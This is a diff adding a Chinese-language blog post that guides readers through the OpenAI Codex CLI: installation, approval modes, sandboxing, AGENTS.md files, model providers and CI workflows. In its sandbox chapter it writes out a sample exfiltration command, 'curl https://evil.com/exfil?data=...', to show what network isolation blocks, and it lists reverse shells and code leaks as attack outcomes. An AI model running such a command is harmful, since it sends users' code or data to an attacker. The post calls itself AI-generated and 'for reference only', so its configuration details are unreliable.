@@ -1,0 +1,442 @@
+---
+title: "OpenAI Codex CLI 完全指南：开源 AI 编程代理从入门到精通"
+description: "由浅入深全面解析 OpenAI Codex CLI 的使用方法，涵盖安装配置、审批模式、沙箱安全、AGENTS.md、自定义指令和高级工作流实例。"
+category: tech
+tags: ["Codex CLI", "OpenAI", "AI编程", "开发者工具", "CLI", "开源"]
+date: 2026-06-14
+draft: false
+cover: "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop"
+---
+
+OpenAI Codex CLI 是一个开源的终端 AI 编程代理，基于 OpenAI 的 o3/o4-mini 等推理模型，能在你的本地环境中读写文件、执行命令、进行多步推理。它的核心卖点是**安全沙箱**和**灵活的审批模式**——你可以精确控制 AI 能做什么、不能做什么。
+
+## 第一章：快速上手
+
+### 安装与启动
+
+```bash
+# 方式一：官方安装脚本（推荐，Mac/Linux）
+curl -fsSL https://chatgpt.com/codex/install.sh | sh
+
+# 方式二：npm 安装
+npm install -g @openai/codex
+
+# 方式三：Homebrew（macOS）
+brew install --cask codex
+
+# 启动交互模式
+codex
+
+# 带提示启动
+codex "解释这个项目的架构"
+```
+
+### 认证方式
+
+```bash
+# 方式一：使用 ChatGPT 账号登录（推荐，包含在 Plus/Pro/Enterprise 套餐中）
+codex  # 首次启动选择 "Sign in with ChatGPT"
+
+# 方式二：使用 API Key
+export OPENAI_API_KEY="sk-..."
+```
+
+### 最基础的用法
+
+进入交互界面后直接用自然语言描述需求：
+
+```
+> 读一下 src/index.ts，告诉我主入口做了什么
+> 帮我添加一个 /health 健康检查端点
+> 修复这个 TypeError: Cannot read property 'name' of undefined
+```
+
+Codex 会分析代码、制定计划、执行操作，每一步都展示给你确认。
+
+### 常用启动参数
+
+```bash
+codex                              # 交互模式（默认 suggest）
+codex --approval-mode full-auto    # 全自动模式
+codex --approval-mode auto-edit    # 自动编辑，命令需确认
+codex --model o3                   # 使用 o3 模型（最强推理）
+codex --model o4-mini              # 使用 o4-mini（快速高效）
+codex --model gpt-4.1              # 使用 GPT-4.1
+codex --quiet                      # 安静模式，减少输出
+codex "任务描述"                    # 非交互模式
+```
+
+## 第二章：核心配置
+
+### 配置文件
+
+Codex 使用 `~/.codex/config.yaml` 作为全局配置：
+
+```yaml
+# ~/.codex/config.yaml
+model: o4-mini
+approval_mode: suggest
+providers:
+  openai:
+    api_key_env: OPENAI_API_KEY
+```
+
+也可以在项目目录下创建 `.codex/config.yaml` 进行项目级覆盖。
+
+### 三种审批模式 —— 安全的灵魂
+
+| 模式 | 文件操作 | Shell 命令 | 适用场景 |
+|------|----------|------------|----------|
+| **suggest**（默认） | 需确认 | 需确认 | 初次使用、敏感项目 |
+| **auto-edit** | 自动执行 | 需确认 | 日常开发 |
+| **full-auto** | 自动执行 | 自动执行（沙箱内） | 批量任务、CI/CD |
+
+```bash
+# 日常开发推荐
+codex --approval-mode auto-edit
+
+# 批量重构、信任 AI 时
+codex --approval-mode full-auto "把所有 var 替换为 const/let"
+```
+
+关键区别：即使在 `full-auto` 模式下，所有命令也运行在**网络隔离的沙箱**里，AI 无法访问互联网或影响沙箱外的系统。
+
+### 环境变量配置
+
+```bash
+# 必需
+export OPENAI_API_KEY="sk-..."
+
+# 可选：使用其他兼容提供商
+export OPENAI_BASE_URL="https://api.your-provider.com/v1"
+
+# 可选：指定默认模型
+export CODEX_DEFAULT_MODEL="o4-mini"
+```
+
+## 第三章：AGENTS.md —— 项目指令文件
+
+类似 Claude Code 的 `CLAUDE.md`，Codex 使用 `AGENTS.md` 来存储项目上下文：
+
+```markdown
+# AGENTS.md
+
+## 项目概述
+这是一个基于 Next.js 14 的电商平台。
+
+## 技术栈
+- 框架：Next.js 14 (App Router)
+- 数据库：PostgreSQL + Prisma
+- 样式：Tailwind CSS
+- 测试：Vitest + Playwright
+
+## 开发规范
+- 所有组件使用 TypeScript strict 模式
+- API 路由统一使用 zod 做参数校验
+- 数据库修改必须通过 migration
+- 提交信息遵循 Conventional Commits
+
+## 常用命令
+- pnpm dev — 开发服务器
+- pnpm test — 运行测试
+- pnpm db:migrate — 执行数据库迁移
+- pnpm lint — ESLint 检查
+```
+
+### AGENTS.md 层级加载
+
+Codex 支持在不同目录放置 `AGENTS.md`，从项目根到当前工作目录依次加载：
+
+```
+my-project/
+├── AGENTS.md              # 全局规范
+├── packages/
+│   ├── AGENTS.md          # 包级规范
+│   └── api/
+│       ├── AGENTS.md      # API 模块特定规范
+│       └── src/
+```
+
+越深层的文件优先级越高，适合大型 monorepo 项目。
+
+## 第四章：沙箱与安全
+
+### 沙箱机制
+
+Codex 的安全模型是其最大亮点之一：
+
+```
+┌─────────────────────────────────────────┐
+│  Codex CLI（主进程）                      │
+│                                         │
+│  ┌───────────────────────────────────┐  │
+│  │  沙箱环境                          │  │
+│  │  ✓ 文件读写（仅项目目录内）          │  │
+│  │  ✓ Shell 命令执行                  │  │
+│  │  ✗ 网络访问（完全隔离）             │  │
+│  │  ✗ 访问项目外文件                  │  │
+│  └───────────────────────────────────┘  │
+└─────────────────────────────────────────┘
+```
+
+**macOS** 上使用 Apple Seatbelt (`sandbox-exec`) 实现隔离；**Linux** 上使用 Docker 容器或 Landlock/iptables 组合。
+
+### 网络隔离的意义
+
+即使 AI 模型被提示注入攻击，它也无法：
+- 外泄源代码到外部服务器
+- 下载恶意依赖
+- 调用未经授权的 API
+- 反弹 Shell
+
+```bash
+# full-auto 下执行的命令示例
+# ✓ 允许：本地文件操作
+cat src/main.ts
+npm run build        # 使用本地缓存的依赖
+
+# ✗ 拒绝：网络请求
+curl https://evil.com/exfil?data=...    # 被沙箱拦截
+npm install new-pkg                      # 需要网络，被拦截
+```
+
+### 自定义沙箱权限
+
+```yaml
+# .codex/config.yaml
+sandbox:
+  # 允许写入的路径（默认仅项目目录）
+  writable_paths:
+    - "./src"
+    - "./tests"
+    - "/tmp"
+  # 允许网络访问的域名（谨慎使用）
+  network_allow:
+    - "registry.npmjs.org"
+```
+
+## 第五章：多模型与多提供商
+
+### 支持的模型
+
+Codex 并不绑定 OpenAI 独家模型，支持任何兼容 OpenAI API 格式的提供商：
+
+| 模型 | 提供商 | 特点 |
+|------|--------|------|
+| **o3** | OpenAI | 最强推理，复杂架构设计 |
+| **o4-mini** | OpenAI | 推理型，速度快性价比高 |
+| **gpt-4.1** | OpenAI | 通用旗舰模型 |
+| **claude-sonnet-4-6** | Anthropic（需适配） | 编码能力强 |
+| **deepseek-r1** | DeepSeek | 开源推理模型 |
+
+### 配置第三方提供商
+
+```bash
+# 使用 Azure OpenAI
+export OPENAI_BASE_URL="https://your-resource.openai.azure.com/openai/deployments/your-deployment"
+export OPENAI_API_KEY="your-azure-key"
+
+# 使用兼容 API 的本地模型（如 Ollama）
+export OPENAI_BASE_URL="http://localhost:11434/v1"
+export OPENAI_API_KEY="ollama"
+codex --model codestral
+```
+
+## 第六章：工作流与实战
+
+### 交互模式使用技巧
+
+```bash
+# 进入交互模式
+codex
+
+# 在对话中可以使用特殊命令
+> /help              # 查看帮助
+> /model o3          # 切换模型
+> /approval auto-edit # 切换审批模式
+> /undo              # 撤销上一步操作
+```
+
+### 实战案例 1：Bug 修复
+
+```bash
+codex "用户报告登录页面在 Safari 上白屏，帮我排查并修复"
+```
+
+Codex 会：
+1. 搜索登录相关的组件代码
+2. 检查 CSS/JS 兼容性问题
+3. 定位可能的 Safari 不兼容语法
+4. 提出修复方案并应用
+5. 显示 diff 等你确认
+
+### 实战案例 2：全自动批量重构
+
+```bash
+codex --approval-mode full-auto \
+  "将项目中所有 moment.js 的使用迁移到 date-fns，更新导入和 API 调用"
+```
+
+在沙箱内全自动完成：分析依赖 → 找到所有使用点 → 逐一迁移 → 运行测试验证。
+
+### 实战案例 3：从测试驱动开发
+
+```bash
+codex --approval-mode auto-edit \
+  "根据 tests/user.test.ts 中的测试用例，实现 src/services/user.ts 中的所有方法"
+```
+
+### 实战案例 4：代码审查
+
+```bash
+# 审查最近的 git 变更
+codex "审查 git diff HEAD~3 的变更，指出潜在 bug 和安全问题"
+```
+
+### 实战案例 5：生成文档
+
+```bash
+codex --approval-mode full-auto \
+  "为 src/api/ 下的所有路由生成 OpenAPI 文档到 docs/api.yaml"
+```
+
+## 第七章：与 CI/CD 集成
+
+### GitHub Actions 示例
+
+```yaml
+# .github/workflows/codex-review.yml
+name: AI Code Review
+on: [pull_request]
+
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+      - run: npm install -g @openai/codex
+      - run: |
+          codex --approval-mode full-auto --quiet \
+            "审查这个 PR 的变更，输出发现的问题"
+        env:
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+```
+
+### 脚本化使用
+
+```bash
+#!/bin/bash
+# auto-fix-lint.sh — 自动修复 lint 错误
+
+LINT_OUTPUT=$(npm run lint 2>&1)
+
+if [ $? -ne 0 ]; then
+  echo "$LINT_OUTPUT" | codex --approval-mode full-auto \
+    "根据以下 lint 错误输出，修复所有问题"
+fi
+```
+
+## 第八章：对比与选择
+
+### Codex CLI vs Claude Code
+
+| 维度 | Codex CLI | Claude Code |
+|------|-----------|-------------|
+| **开源** | 完全开源（Apache 2.0） | 闭源 |
+| **模型** | OpenAI 系列（o3/o4-mini/GPT-4.1） | Claude 系列（Opus/Sonnet） |
+| **安全** | 网络隔离沙箱 | 权限白名单 + 确认机制 |
+| **配置文件** | AGENTS.md | CLAUDE.md |
+| **审批** | 三级模式 | 权限层级系统 |
+| **生态** | 兼容 OpenAI API 格式提供商 | MCP 协议生态 |
+| **隔离** | 内置沙箱 | Git Worktree |
+| **定价** | 按 API 调用计费 | 订阅制（Max/Pro） |
+
+### 什么时候选 Codex？
+
+- 你需要完全开源、可审计的工具
+- 你已经在用 OpenAI API，不想切换
+- 安全合规要求严格，需要网络隔离沙箱
+- 你想基于它做二次开发或定制
+
+### 什么时候选 Claude Code？
+
+- 你需要更丰富的生态（MCP、Skills、Hooks）
+- 你需要跨会话记忆和上下文管理
+- 你偏好 Claude 模型的代码能力
+- 你需要 Worktree 并行开发和 /batch 批量操作
+
+## 第九章：最佳实践
+
+### 1. 渐进式信任
+
+```bash
+# 第一天：全部手动确认
+codex --approval-mode suggest
+
+# 熟悉后：自动编辑，命令确认
+codex --approval-mode auto-edit
+
+# 批量任务：全自动（沙箱保护）
+codex --approval-mode full-auto
+```
+
+### 2. 写好 AGENTS.md
+
+```markdown
+## 绝对不要做的事
+- 不要删除 migrations 文件
+- 不要修改 .env.production
+- 不要在没有测试的情况下修改支付逻辑
+
+## 代码风格偏好
+- 优先使用函数式组件和 hooks
+- 错误处理使用 Result 模式而非 try-catch
+- 数据库查询封装在 Repository 层
+```
+
+### 3. 组合使用模型
+
+```bash
+# 简单任务用小模型（快+省）
+codex --model o4-mini "给这个函数加上 JSDoc 注释"
+
+# 复杂推理用大模型
+codex --model o3 "重新设计这个模块，当前架构有哪些问题？给出改进方案"
+```
+
+### 4. 利用沙箱做危险实验
+
+```bash
+# 在沙箱里大胆尝试，不满意就撤销
+codex --approval-mode full-auto \
+  "尝试把这个 class 组件重构成 hooks，如果测试不通过就恢复"
+```
+
+## 总结：我的 Codex 工作流
+
+```
+项目初始化：
+  创建 AGENTS.md → 写明规范 → 设置审批模式
+
+日常开发：
+  codex --approval-mode auto-edit
+  描述需求 → 查看计划 → 确认执行 → 审查结果
+
+批量重构：
+  codex --approval-mode full-auto "全局重命名/迁移/风格统一"
+
+代码审查：
+  codex "审查最近的变更，关注安全和性能"
+
+CI 集成：
+  PR 触发 → 自动审查 → 输出建议
+```
+
+Codex CLI 的设计哲学是「开源透明 + 安全优先」—— 你可以完全审计它做了什么，沙箱确保它做不了越界的事。对于注重安全合规、偏好 OpenAI 生态、或需要二次开发的团队来说，它是一个值得认真考虑的选择。
+
+---
+
+> 本文由 AI 整理生成，基于 OpenAI Codex CLI 开源项目信息编写，仅供参考。实际功能以官方文档为准：https://github.com/openai/codex
